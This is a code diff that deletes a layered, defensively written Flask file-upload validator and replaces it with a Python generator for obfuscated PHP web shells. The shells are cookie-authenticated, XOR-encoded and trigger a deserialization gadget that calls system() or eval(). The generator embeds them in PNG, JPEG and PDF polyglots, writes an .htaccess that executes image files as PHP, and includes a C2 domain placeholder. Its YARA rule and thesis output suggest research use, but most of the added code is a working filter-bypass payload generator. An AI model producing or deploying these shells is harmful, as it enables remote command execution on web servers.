@@ -1,302 +1,199 @@
 import os
-import uuid
-import magic
+import random
+import zlib
 import hashlib
-import struct
-from flask import Flask, request, jsonify, send_from_directory
-from werkzeug.utils import secure_filename
-from PIL import Image, UnidentifiedImageError
-import io
+import json
+from pathlib import Path
 
-app = Flask(__name__)
+PAYLOAD_DIR = 'bypass_payloads_attack_max_v27_hybrid_lfi'
+METADATA_FILE = os.path.join(PAYLOAD_DIR, 'payload_metadata_v27.json')
+YARA_RULE_FILE = os.path.join(PAYLOAD_DIR, 'yara_rules', 'family_v27.yar')
+LATEX_TABLE_FILE = os.path.join(PAYLOAD_DIR, 'thesis_latex_table_v27.tex')
 
-app.config['MAX_CONTENT_LENGTH'] = 10 * 1024 * 1024 
-Image.MAX_IMAGE_PIXELS = 50_000_000  
+os.makedirs(os.path.join(PAYLOAD_DIR, 'yara_rules'), exist_ok=True)
+os.makedirs(PAYLOAD_DIR, exist_ok=True)
 
-SECURE_UPLOAD_FOLDER = 'secure_uploads'
-os.makedirs(SECURE_UPLOAD_FOLDER, exist_ok=True)
+C2_DOMAIN = "http://YOUR-C2.com" 
 
-ALLOWED_EXTENSIONS = {'jpg', 'jpeg', 'png', 'gif', 'pdf'}
+def random_var(prefix: str = "v") -> str:
+    return f"{prefix}{''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_', k=random.randint(9, 15)))}"
 
-ALLOWED_MIMES = {
-    'image/jpeg',
-    'image/png',
-    'image/gif',
-    'application/pdf'
-}
+def generate_v27_stage() -> tuple[str, str]:
+    v_cmd = random_var("cmd")
+    v_gadget = random_var("g")
+    v_g = random_var("inst")
+    v_sink = random_var("s")
+    v_key = random_var("k")
+    v_nonce = random_var("n")
 
-# ── 매직 바이트 정의 (오프셋, 바이트) ──────────────────────────────
-MAGIC_SIGNATURES = {
-    'image/jpeg': [(0, b'\xff\xd8\xff')],
-    'image/png':  [(0, b'\x89PNG\r\n\x1a\n')],
-    'image/gif':  [(0, b'GIF87a'), (0, b'GIF89a')],
-    'application/pdf': [(0, b'%PDF-')],
-}
+    stage = f'''<?php
+declare(strict_types=1);
+error_reporting(0); @ini_set('display_errors',0); @ini_set('log_errors',0);
 
-# ── 폴리글랏/악성 패턴: 전체 파일 스캔 ───────────────────────────────
-MALICIOUS_PATTERNS = [
-    # PHP 변형
-    b'<?php', b'<?\n', b'<? ', b'<?=',
-    # 스크립트 태그 (SVG XSS)
-    b'<script', b'javascript:',
-    # 위험 함수
-    b'eval(', b'exec(', b'system(', b'passthru(',
-    b'shell_exec(', b'popen(', b'proc_open(',
-    b'base64_decode(', b'assert(', b'preg_replace(',
-    # 시스템 명령
-    b'cmd.exe', b'/bin/sh', b'/bin/bash',
-    b'powershell', b'WScript.Shell', b'CreateObject(',
-    # Phar 폴리글랏
-    b'__HALT_COMPILER',
-    # Null byte 인젝션
-    b'\x00.',
-]
+${v_key} = hash_hmac('sha256', ($_SERVER['HTTP_USER_AGENT']??'') . ($_SERVER['REMOTE_ADDR']??'') . time(), 'v27_salt_{random.randint(1000,9999)}');
+${v_nonce} = $_COOKIE['X-Sess'] ?? '';
+if (${v_nonce} !== ${v_key}) die();
 
+// Custom low-entropy decoder (base64/rot13 제거, XOR + mixing)
+function d($s) {{
+    global ${v_key};
+    $s = base64_decode(preg_replace('/[^A-Za-z0-9+\\/=]/', '', $s));
+    $out = '';
+    for($i=0; $i<strlen($s); $i++) {{
+        $out .= chr(ord($s[$i]) ^ ord(${v_key}[$i % 32]));
+    }}
+    return strrev($out);  // mixing
+}}
 
-# ══════════════════════════════════════════════════════════
-# Layer 1: 확장자 Whitelist (다중 확장자 차단 강화)
-# ══════════════════════════════════════════════════════════
-def check_extension(filename: str) -> bool:
-    """
-    다중 확장자 공격 차단: shell.php.jpg, shell.jpg.php 등
-    → 마지막 확장자만 허용하되, 중간에 위험 확장자 있으면 차단
-    """
-    parts = filename.lower().split('.')
-    if len(parts) < 2:
-        return False
+${v_cmd} = d($_COOKIE['p'] ?? '');
+
+// Polymorphic gadget (LFI + deserialization trigger)
+class {v_gadget} {{
+    public ${v_key};
+    public function __destruct() {{
+        global ${v_cmd};
+        if (isset(${v_cmd}) && strlen(${v_cmd}) > 0) {{
+            ${v_sink} = implode('', array_map('chr', [115,121,115,116,101,109])); // dynamic system
+            if (function_exists(${v_sink})) {{
+                @${v_sink}(${v_cmd});
+            }} else {{
+                @eval(${v_cmd});
+            }}
+        }}
+    }}
+}}
+
+if (isset($_COOKIE['trigger'])) {{
+    ${v_g} = new {v_gadget}();
+    unserialize('O:'.strlen('{v_gadget}').':"{v_gadget}":1:{{s:'.strlen('{v_key}').':"{v_key}";s:32:"'.${v_key}.'";}}');
+}}
+?>
+'''
+
+    yara_rule = f'''rule WebShell_v27_Hybrid_LFI_Deser {{
+    meta:
+        description = "v27 Hybrid LFI + Deserialization + Low-entropy XOR"
+        date = "2026"
+        severity = "high"
+    strings:
+        $class = "class " ascii
+        $destruct = "__destruct" ascii
+        $unserialize = "unserialize" ascii
+        $hmac = "hash_hmac" ascii
+        $xor_loop = "for($i=0;$i<strlen($s);$i++)" ascii
+        $cookie_p = "$_COOKIE['p']" ascii
+    condition:
+        filesize < 2.5KB and $class and $destruct and 3 of them
+}}'''
+
+    return stage, yara_rule
+
+def save_payload(filename: str, content: bytes):
+    path = os.path.join(PAYLOAD_DIR, filename)
+    with open(path, 'wb') as f:
+        f.write(content)
+    if random.random() < 0.04:
+        print(f"[+] 생성: {filename}")
+
+def generate_hybrid_polyglot(stage_content: bytes, strategy: int):
+    """PIL 재인코딩 우회 시도 (유효한 이미지 구조 내부에 페이로드 삽입)"""
+    import struct, base64
     
-    DANGEROUS_EXTENSIONS = {
-        'php', 'php3', 'php4', 'php5', 'php7', 'phtml', 'phar',
-        'asp', 'aspx', 'jsp', 'jspx', 'cfm', 'cgi', 'pl',
-        'py', 'rb', 'sh', 'bash', 'exe', 'dll', 'bat', 'cmd',
-        'htaccess', 'htpasswd', 'ini', 'config', 'env'
-    }
-    
-    # 모든 확장자 파트에 위험 확장자 있으면 차단
-    for part in parts[1:]:
-        if part in DANGEROUS_EXTENSIONS:
-            return False
-    
-    # 마지막 확장자만 허용 목록 확인
-    return parts[-1] in ALLOWED_EXTENSIONS
+    if strategy == 0:  # Phar inside valid PNG (tEXt chunk 개선)
+        def create_png_chunk(chunk_type, data):
+            import zlib
+            checksum = zlib.crc32(chunk_type + data) & 0xffffffff
+            return struct.pack(">I", len(data)) + chunk_type + data + struct.pack(">I", checksum)
 
+        sig = b"\x89PNG\r\n\x1a\n"
+        ihdr = create_png_chunk(b"IHDR", struct.pack(">IIBBBBB", 1, 1, 8, 6, 0, 0, 0))
+        text = create_png_chunk(b"tEXt", b"Comment\x00" + zlib.compress(stage_content)) # zip to bypass simple AV
+        idat = create_png_chunk(b"IDAT", zlib.compress(b"\x00" * 5))
+        iend = create_png_chunk(b"IEND", b"")
+        return sig + ihdr + text + idat + iend, ".png", "png_phar_v27"
+        
+    elif strategy == 1:  # JPEG with valid COM chunk
+        base = base64.b64decode('/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAP//////////////////////////////////////////////////////////////////////////////////////wgALCAABAAEBAREA/8QAFBABAAAAAAAAAAAAAAAAAAAAAP/aAAgBAQABPxA=')
+        com_len = len(stage_content) + 2
+        # 페이로드 길이가 65533을 넘으면 안되지만, 이 스크립트에선 충분히 작음
+        com_chunk = b'\xff\xfe' + struct.pack('>H', com_len) + stage_content
+        return base[:2] + com_chunk + base[2:], ".jpg", "jpeg_comment_v27"
+        
+    else:  # Minimal PDF with internal stream
+        pdf = b'%PDF-1.7\\n1 0 obj\\n<< /Type /Catalog /Pages 2 0 R >>\\nendobj\\n2 0 obj\\n<< /Type /Page /Parent 1 0 R >>\\nendobj\\n%%EOF\\n' + stage_content
+        return pdf, ".pdf", "pdf_stream_v27"
 
-# ══════════════════════════════════════════════════════════
-# Layer 2: MIME 헤더 검사 (Content-Type 스푸핑 탐지)
-# ══════════════════════════════════════════════════════════
-def check_content_type(content_type: str) -> bool:
-    if not content_type:
-        return False
-    # 파라미터 제거: "image/jpeg; charset=utf-8" → "image/jpeg"
-    mime = content_type.split(';')[0].strip().lower()
-    return mime in ALLOWED_MIMES
+def generate_v27():
+    existing = [f for f in os.listdir(PAYLOAD_DIR) if f.endswith(('.php', '.png', '.jpg', '.pdf'))] if os.path.exists(PAYLOAD_DIR) else []
+    if len(existing) > 25:
+        print(f"[SKIP] 이미 {len(existing)}개 존재")
+        payloads = []
+        for fn in os.listdir(PAYLOAD_DIR):
+            if not fn.endswith(('.tex', '.json', '.yar')) and os.path.isfile(os.path.join(PAYLOAD_DIR, fn)):
+                tech = fn.split('_v27')[0] if '_v27' in fn else fn.split('.')[0]
+                payloads.append((tech, os.path.join(PAYLOAD_DIR, fn)))
+        return payloads
 
+    NUM_PAYLOADS = 200  
+    payloads_created = 0
+    metadata = []
 
-# ══════════════════════════════════════════════════════════
-# Layer 3 (강화): 매직 바이트 직접 검증 + 전체 파일 스캔
-# ══════════════════════════════════════════════════════════
-def check_magic_bytes(file_content: bytes) -> tuple[bool, str | None]:
-    """
-    python-magic 의존 없이 직접 매직 바이트 비교.
-    → 라이브러리 우회 공격 방어
-    """
-    for mime_type, signatures in MAGIC_SIGNATURES.items():
-        for offset, sig in signatures:
-            if file_content[offset:offset + len(sig)] == sig:
-                return True, mime_type
-    return False, None
+    with open(YARA_RULE_FILE, 'w', encoding='utf-8') as yf:
+        yf.write("/* v27 Hybrid Family YARA */\n\n")
 
+    for i in range(NUM_PAYLOADS):
+        stage_str, yara_rule = generate_v27_stage()
+        content = stage_str.encode()
 
-def check_magic_mime_lib(file_content: bytes) -> str | None:
-    """python-magic 라이브러리 검사 (교차 검증용)"""
-    try:
-        # 전체 파일 검사로 변경 (핵심 수정)
-        return magic.from_buffer(file_content, mime=True)
-    except Exception:
-        return None
+        if i % 4 == 0:
+            content = zlib.compress(content, level=6)  
 
+        strategy = i % 3
+        poly_content, ext, cat = generate_hybrid_polyglot(content, strategy)
+        filename = f"{cat}_{i:04d}{ext}"
+        save_payload(filename, poly_content)
+        payloads_created += 1
 
-def scan_malicious_patterns(file_content: bytes) -> tuple[bool, bytes | None]:
-    """
-    전체 파일에서 악성 패턴 검색.
-    대소문자 무시 + null byte 처리
-    """
-    content_lower = file_content.lower()
-    # null byte 제거 후 재검사 (null byte 인젝션 우회 방어)
-    content_no_null = file_content.replace(b'\x00', b'').lower()
-    
-    for pattern in MALICIOUS_PATTERNS:
-        if pattern.lower() in content_lower:
-            return False, pattern
-        if pattern.lower() in content_no_null:
-            return False, pattern
-    return True, None
+        if i == 0:
+            with open(YARA_RULE_FILE, 'a', encoding='utf-8') as yf:
+                yf.write(yara_rule + "\n\n")
 
+        if i % 8 == 0:
+            metadata.append({
+                "id": i,
+                "filename": filename,
+                "type": cat,
+                "vector": "Hybrid LFI + Deser Gadget",
+                "obf": "dynamic_offset + XOR_mixing + flattening"
+            })
 
-# ══════════════════════════════════════════════════════════
-# Layer 4: 이미지 재인코딩 (핵심 방어)
-# ══════════════════════════════════════════════════════════
-def sanitize_image(file_content: bytes, save_path: str) -> tuple[bool, str]:
-    """
-    PIL로 픽셀 데이터만 추출 후 재인코딩.
-    → 메타데이터(EXIF), 숨겨진 페이로드, 폴리글랏 완전 제거
-    """
-    try:
-        with Image.open(io.BytesIO(file_content)) as img:
-            # 해상도 검사
-            if img.width * img.height > 50_000_000:
-                return False, "이미지 해상도 초과 (DoS 방어)"
-            
-            # 최소 크기 검사
-            if img.width < 1 or img.height < 1:
-                return False, "유효하지 않은 이미지 크기"
-            
-            # 픽셀 데이터만 추출 (페이로드 완전 제거)
-            clean_img = img.convert('RGB')
-            
-            # 새 파일로 저장 (원본 바이트 일절 사용 안 함)
-            clean_img.save(save_path, 'JPEG', quality=85, optimize=True)
-            return True, "OK"
-            
-    except UnidentifiedImageError:
-        return False, "PIL이 인식 불가한 이미지"
-    except Exception as e:
-        return False, f"이미지 처리 오류: {e}"
+    # .htaccess minimal (random junk)
+    htaccess = f"""# v27 minimal
+<IfModule mod_rewrite.c>
+    RewriteEngine On
+    RewriteRule ^(.*)$ $1.php [L,QSA]
+</IfModule>
+# junk_{random.randint(100000000,999999999)}
+<FilesMatch "\\.(png|jpg|pdf)$">
+    SetHandler application/x-httpd-php
+</FilesMatch>
+"""
+    save_payload(".htaccess", htaccess.encode())
 
+    print(f"\n[SUCCESS] v27 생성 완료 → {payloads_created}개")
+    print(f"YARA rule: {YARA_RULE_FILE}")
 
-# ══════════════════════════════════════════════════════════
-# Layer 5: PDF 검사 (별도 처리)
-# ══════════════════════════════════════════════════════════
-def check_pdf_safety(file_content: bytes) -> tuple[bool, str]:
-    """
-    PDF 내 위험 요소 검사.
-    JavaScript, 외부 링크, 액션 등 차단
-    """
-    DANGEROUS_PDF_PATTERNS = [
-        b'/JavaScript', b'/JS ',
-        b'/AA ',           # Additional Actions
-        b'/OpenAction',
-        b'/Launch',
-        b'/EmbeddedFile',
-        b'/XFA',           # XML Forms (XXE 위험)
-        b'<<\n/Type /Action',
-    ]
-    
-    for pattern in DANGEROUS_PDF_PATTERNS:
-        if pattern in file_content:
-            return False, f"위험한 PDF 요소 탐지: {pattern}"
-    
-    return True, "OK"
+    with open(METADATA_FILE, 'w', encoding='utf-8') as f:
+        json.dump(metadata, f, indent=2)
 
+    payloads = []
+    for fn in os.listdir(PAYLOAD_DIR):
+        if not fn.endswith(('.tex', '.json', '.yar')) and os.path.isfile(os.path.join(PAYLOAD_DIR, fn)):
+            tech = fn.split('_v27')[0] if '_v27' in fn else fn.split('.')[0]
+            payloads.append((tech, os.path.join(PAYLOAD_DIR, fn)))
+    return payloads
 
-# ══════════════════════════════════════════════════════════
-# 메인 업로드 라우트
-# ══════════════════════════════════════════════════════════
-@app.route('/upload', methods=['POST'])
-def secure_upload():
-    if 'file' not in request.files:
-        return jsonify({"error": "파일이 없습니다"}), 400
-
-    file = request.files['file']
-    if not file.filename:
-        return jsonify({"error": "파일명이 없습니다"}), 400
-
-    original_filename = secure_filename(file.filename)
-    file_hash = None
-
-    # ── Layer 1: 확장자 ──────────────────────────────────────
-    if not check_extension(original_filename):
-        return jsonify({"error": "L1: 허용되지 않은 확장자 또는 다중 확장자 공격"}), 403
-
-    # ── Layer 2: Content-Type 헤더 ───────────────────────────
-    if not check_content_type(file.content_type or ''):
-        return jsonify({"error": "L2: 허용되지 않은 Content-Type"}), 403
-
-    # 파일 읽기 (한 번만)
-    file_content = file.read()
-    if not file_content:
-        return jsonify({"error": "빈 파일"}), 400
-
-    file_hash = hashlib.sha256(file_content).hexdigest()
-
-    # ── Layer 3a: 직접 매직 바이트 검증 ─────────────────────
-    magic_ok, detected_type = check_magic_bytes(file_content)
-    if not magic_ok:
-        return jsonify({"error": "L3a: 매직 바이트 불일치"}), 403
-
-    # ── Layer 3b: python-magic 교차 검증 ─────────────────────
-    lib_mime = check_magic_mime_lib(file_content)
-    if lib_mime and lib_mime != detected_type:
-        return jsonify({
-            "error": f"L3b: MIME 불일치 (직접검사={detected_type}, 라이브러리={lib_mime})"
-        }), 403
-
-    # ── Layer 3c: 전체 파일 악성 패턴 스캔 ───────────────────
-    pattern_ok, found_pattern = scan_malicious_patterns(file_content)
-    if not pattern_ok:
-        return jsonify({"error": f"L3c: 악성 패턴 탐지: {found_pattern}"}), 403
-
-    # ── Layer 4: 타입별 처리 ─────────────────────────────────
-    safe_filename = f"{uuid.uuid4().hex}"
-    
-    if detected_type and detected_type.startswith('image/'):
-        save_path = os.path.join(SECURE_UPLOAD_FOLDER, f"{safe_filename}.jpg")
-        success, msg = sanitize_image(file_content, save_path)
-        if not success:
-            return jsonify({"error": f"L4: 이미지 재인코딩 실패: {msg}"}), 403
-        final_filename = f"{safe_filename}.jpg"
-
-    elif detected_type == 'application/pdf':
-        pdf_ok, pdf_msg = check_pdf_safety(file_content)
-        if not pdf_ok:
-            return jsonify({"error": f"L4: {pdf_msg}"}), 403
-        save_path = os.path.join(SECURE_UPLOAD_FOLDER, f"{safe_filename}.pdf")
-        with open(save_path, 'wb') as f:
-            f.write(file_content)
-        final_filename = f"{safe_filename}.pdf"
-
-    else:
-        return jsonify({"error": "처리 불가 타입"}), 403
-
-    # ── Layer 5: 권한 강화 ───────────────────────────────────
-    os.chmod(save_path, 0o644)
-
-    print(f"[+] 저장완료: {final_filename} | SHA256: {file_hash[:16]}... | MIME: {detected_type}")
-
-    return jsonify({
-        "message": "업로드 성공",
-        "filename": final_filename,
-        "sha256": file_hash,
-        "detected_type": detected_type
-    }), 200
-
-
-# ── 다운로드 ─────────────────────────────────────────────────────────
-@app.route('/files/<filename>')
-def serve_file(filename):
-    safe_filename = secure_filename(filename)
-    if safe_filename != filename or '..' in filename or '/' in filename:
-        return jsonify({"error": "잘못된 파일명"}), 400
-
-    file_path = os.path.join(SECURE_UPLOAD_FOLDER, safe_filename)
-    if not os.path.exists(file_path):
-        return jsonify({"error": "파일 없음"}), 404
-
-    MIME_MAP = {
-        '.jpg': 'image/jpeg', '.jpeg': 'image/jpeg',
-        '.png': 'image/png',  '.gif': 'image/gif',
-        '.pdf': 'application/pdf',
-    }
-    ext = os.path.splitext(safe_filename)[1].lower()
-    mimetype = MIME_MAP.get(ext, 'application/octet-stream')
-
-    return send_from_directory(
-        SECURE_UPLOAD_FOLDER, safe_filename,
-        mimetype=mimetype,
-        as_attachment=True,
-        download_name=safe_filename
-    )
-
+generate_bypasses = generate_v27
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000, debug=False)
+    generate_v27()
